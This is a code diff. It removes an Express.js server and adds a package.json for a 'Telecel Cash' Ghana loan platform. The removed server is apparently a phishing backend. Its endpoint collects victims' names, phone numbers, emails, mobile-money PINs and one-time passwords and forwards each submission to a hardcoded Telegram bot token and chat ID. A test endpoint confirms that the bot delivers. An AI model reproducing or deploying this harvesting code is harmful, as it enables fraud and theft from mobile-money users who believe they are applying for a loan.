@@ -1,79 +1,19 @@
-const express = require('express');
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-app.use(express.json());
-
-// CORS
-app.use((req, res, next) => {
-    res.header('Access-Control-Allow-Origin', '*');
-    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.header('Access-Control-Allow-Headers', 'Content-Type');
-    if (req.method === 'OPTIONS') return res.sendStatus(200);
-    next();
-});
-
-// ========== TELEGRAM CREDENTIALS ==========
-const TG_BOT_TOKEN = '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA';
-const TG_CHAT_ID = '6414813627';  // YOUR chat ID for notifications
-
-// Health check
-app.get('/health', (req, res) => {
-    res.json({ status: 'healthy', uptime: process.uptime() });
-});
-
-// Root endpoint
-app.get('/', (req, res) => {
-    res.json({ status: 'OK', message: 'Telecel Cash API is running!' });
-});
-
-// Main send endpoint
-app.post('/api/send-telegram', async (req, res) => {
-    try {
-        const { phone, pin, email, name, type, site, amount, term, monthly } = req.body;
-        const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Accra' });
-        
-        let message = '';
-        if (type === 'application') {
-            message = `📱 NEW APPLICATION - Telecel Cash 📱\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email}\n💰 Amount: ₵${amount}\n📅 Term: ${term} months\n💵 Monthly: ₵${monthly}\n💼 Income: ₵${pin}\n⏰ Time: ${timestamp}`;
-        } else if (type === 'pin') {
-            message = `🔐 PIN CONFIRMED - Telecel Cash 🔐\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n💰 Amount: ₵${amount}\n🔑 PIN: ${pin}\n⏰ Time: ${timestamp}`;
-        } else if (type === 'otp') {
-            message = `✅ OTP VERIFIED - Telecel Cash ✅\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n💰 Amount: ₵${amount}\n🔢 OTP: ${pin}\n⏰ Time: ${timestamp}`;
-        } else {
-            message = `📝 NEW SUBMISSION\n\nName: ${name}\nPhone: ${phone}\nDetails: ${pin}\n⏰ Time: ${timestamp}`;
-        }
-        
-        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
-        const response = await fetch(url);
-        const result = await response.json();
-        
-        res.json({ success: result.ok, error: result.description });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// ========== TEST ENDPOINT (ADD THIS) ==========
-app.post('/api/test-telegram', async (req, res) => {
-    try {
-        const testMessage = `🔧 TEST MESSAGE 🔧\n\nTelecel Cash Bot is working!\nTime: ${new Date().toLocaleString()}\n\nIf you receive this, your bot is configured correctly! ✅`;
-        
-        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(testMessage)}`;
-        const response = await fetch(url);
-        const result = await response.json();
-        
-        if (result.ok) {
-            res.json({ success: true, message: 'Test message sent to Telegram!' });
-        } else {
-            res.json({ success: false, error: result.description });
-        }
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Telecel Cash Backend running on port ${PORT}`);
-    console.log(`📱 Notifications sent to chat ID: ${TG_CHAT_ID}`);
-});
+{
+  "name": "telecel-cash-backend",
+  "version": "1.0.0",
+  "description": "Backend API for Telecel Cash - Ghana Loan Platform",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js",
+    "dev": "nodemon server.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2"
+  },
+  "devDependencies": {
+    "nodemon": "^3.0.1"
+  },
+  "keywords": ["telecel", "cash", "loan", "ghana", "telegram"],
+  "author": "Telecel Cash",
+  "license": "ISC"
+}
